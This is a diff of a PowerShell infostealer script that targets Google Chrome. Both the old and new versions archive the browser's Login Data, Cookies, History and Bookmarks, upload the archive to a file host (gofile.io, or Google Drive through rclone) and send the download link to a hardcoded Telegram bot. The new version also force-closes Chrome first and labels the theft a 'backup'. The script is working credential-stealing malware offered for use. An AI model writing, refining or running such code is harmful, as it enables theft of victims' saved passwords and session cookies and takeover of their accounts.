@@ -1,127 +1,67 @@
+# ==== User Configuration ====
 $botToken = "8529187820:AAGN2vlcmLBtf-EaZKWfkR9ufRrVOssQMKo"
- $chatID = "8121448802"
+$chatId   = "8121448802"
+$googleDriveFolderPath = "payload"  # Google Drive folder name
 
-# Function for sending messages through Telegram Bot
-function Send-TelegramMessage {
-    param (
-        [string]$message
-    )
+# ==== 1. Compress Chrome Data ====
+$src = "$env:LOCALAPPDATA\Google\Chrome\User Data"
+$zipPath = "$env:TEMP\ChromeBackup.zip"
 
-    if ($botToken -and $chatID) {
-        $uri = "https://api.telegram.org/bot$botToken/sendMessage"
-        $body = @{
-            chat_id = $chatID
-            text = $message
-        }
+Write-Host "[1/4] Compressing Chrome data..."
+Write-Host "Terminating Chrome processes..."
+Stop-Process -Name chrome -Force -ErrorAction SilentlyContinue
+Start-Sleep -Seconds 1
 
-        try {
-            Invoke-RestMethod -Uri $uri -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
-        } catch {
-            Write-Host "Failed to send message to Telegram: $_"
-        }
-    } else {
-        Send-DiscordMessage -message $message
-    }
+if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
+
+# Compress only essential folders (faster)
+$foldersToCompress = @(
+    "$src\Default\Cookies",
+    "$src\Default\History",
+    "$src\Default\Bookmarks",
+    "$src\Default\Login Data"
+)
+
+$foldersToCompress | Where-Object { Test-Path $_ } | ForEach-Object {
+    Compress-Archive -Path $_ -DestinationPath $zipPath -Update
 }
 
-# Function for sending messages through Discord Webhook
-function Send-DiscordMessage {
-    param (
-        [string]$message
-    )
+# ==== 2. Upload to Google Drive using rclone ====
+Write-Host "[2/4] Uploading to Google Drive..."
 
-    $body = @{
-        content = $message
-    }
+$timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
+$fileName = "ChromeBackup_$timestamp.zip"
 
+# Check if rclone is installed
+$rclonePath = "rclone.exe"
+$rcloneCheck = Get-Command $rclonePath -ErrorAction SilentlyContinue
+
+if ($rcloneCheck) {
     try {
-        Invoke-RestMethod -Uri $webhook -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
+        # Upload using rclone to gdrive:payload folder
+        & $rclonePath copy $zipPath "gdrive:$googleDriveFolderPath" -v
+        
+        Write-Host "[3/4] Upload successful!"
+        $link = "https://drive.google.com/drive/folders/payload"
+        Write-Host $link
     } catch {
-        Write-Host "Failed to send message to Discord: $_"
+        Write-Host "[3/4] Upload failed: $_"
+        Write-Host "File saved locally: $zipPath"
+        $link = $zipPath
     }
-}
-
-function Upload-FileAndGetLink {
-    param (
-        [string]$filePath
-    )
-
-    # Get URL from GoFile
-    $serverResponse = Invoke-RestMethod -Uri 'https://api.gofile.io/getServer'
-    if ($serverResponse.status -ne "ok") {
-        Write-Host "Failed to get server URL: $($serverResponse.status)"
-        return $null
-    }
-
-    # Define the upload URI
-    $uploadUri = "https://$($serverResponse.data.server).gofile.io/uploadFile"
-
-    # Prepare the file for uploading
-    $fileBytes = Get-Content $filePath -Raw -Encoding Byte
-    $fileEnc = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes)
-    $boundary = [System.Guid]::NewGuid().ToString()
-    $LF = "`r`n"
-    $bodyLines = (
-        "--$boundary",
-        "Content-Disposition: form-data; name=`"file`"; filename=`"$([System.IO.Path]::GetFileName($filePath))`"",
-        "Content-Type: application/octet-stream",
-        $LF,
-        $fileEnc,
-        "--$boundary--",
-        $LF
-    ) -join $LF
-
-    # Upload the file
-    try {
-        $response = Invoke-RestMethod -Uri $uploadUri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
-        if ($response.status -ne "ok") {
-            Write-Host "Failed to upload file: $($response.status)"
-            return $null
-        }
-        return $response.data.downloadPage
-    } catch {
-        Write-Host "Failed to upload file: $_"
-        return $null
-    }
-}
-
-
-# Check for 7zip path
-$zipExePath = "C:\Program Files\7-Zip\7z.exe"
-if (-not (Test-Path $zipExePath)) {
-    $zipExePath = "C:\Program Files (x86)\7-Zip\7z.exe"
-}
-
-# Check for Chrome executable and user data
-$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
-if (-not (Test-Path $chromePath)) {
-    Send-TelegramMessage -message "Chrome User Data path not found!"
-    exit
-}
-
-# Exit if 7zip path not found
-if (-not (Test-Path $zipExePath)) {
-    Send-TelegramMessage -message "7Zip path not found!"
-    exit
-}
-
-# Create a zip of the Chrome User Data
-$outputZip = "$env:TEMP\chrome_data.zip"
-& $zipExePath a -r $outputZip $chromePath
-if ($LASTEXITCODE -ne 0) {
-    Send-TelegramMessage -message "Error creating zip file with 7-Zip"
-    exit
-}
-
-# Upload the file and get the link
-$link = Upload-FileAndGetLink -filePath $outputZip
-
-# Check if the upload was successful and send the link via Telegram
-if ($link -ne $null) {
-    Send-TelegramMessage -message "Download link: $link"
 } else {
-    Send-TelegramMessage -message "Failed to upload file to gofile.io"
+    Write-Host "[3/4] rclone not installed. Using local backup only."
+    Write-Host "Install rclone from: https://rclone.org/downloads/"
+    Write-Host "File saved: $zipPath"
+    $link = $zipPath
 }
 
-# Remove the zip file after uploading
-Remove-Item $outputZip
+# ==== 3. Send to Telegram ====
+Write-Host "[4/4] Sending link to Telegram..."
+$telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage"
+Invoke-RestMethod -Uri $telegramUrl -Method Post -Body @{
+    chat_id = $chatId
+    text    = "Chrome backup link: $link"
+}
+
+Write-Host "Done! Check Telegram for the link."
